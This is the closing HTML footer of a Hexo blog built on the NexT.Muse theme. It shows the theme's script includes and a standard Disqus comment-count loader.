  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

<script>
  function loadCount() {
    var d = document, s = d.createElement('script');
    s.src = 'https://chuanleiguo-com.disqus.com/count.js';
    s.id = 'dsq-count-scr';
    (d.head || d.body).appendChild(s);
  }
  // defer loading until the whole page loading is completed
  window.addEventListener('load', loadCount, false);
</script>

</body>
</html>
